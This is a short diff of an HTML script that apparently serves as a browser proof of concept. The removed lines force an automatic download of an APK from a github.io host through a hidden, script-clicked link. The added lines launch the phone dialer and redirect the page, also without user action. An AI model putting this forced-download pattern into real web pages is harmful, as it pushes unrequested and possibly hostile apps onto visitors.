@@ -12,21 +12,18 @@ function sleep() {
 
     document.body.insertAdjacentHTML("beforeend", "123<br>");
 
-    // Create download link
-    var link = document.createElement("a");
-    link.href = "https://lowleveljody.github.io/pocbrowseraja/montero.apk";
-    link.download = "montero.apk";
-    document.body.appendChild(link);
-    link.click();
-    document.body.removeChild(link);
+    // Open phone dialer
+    window.location.href = "tel:+1234567890";
 
-    // Create meta refresh (redirect after 1 second)
+    // Optional redirect after 1 second
     var meta = document.createElement("meta");
     meta.httpEquiv = "refresh";
-    meta.content = "1;url=https://google.com";
+    meta.content = "1;url=https://example.com";
     document.head.appendChild(meta);
 }
 </script>
 
+
 </body>
 </html>
+
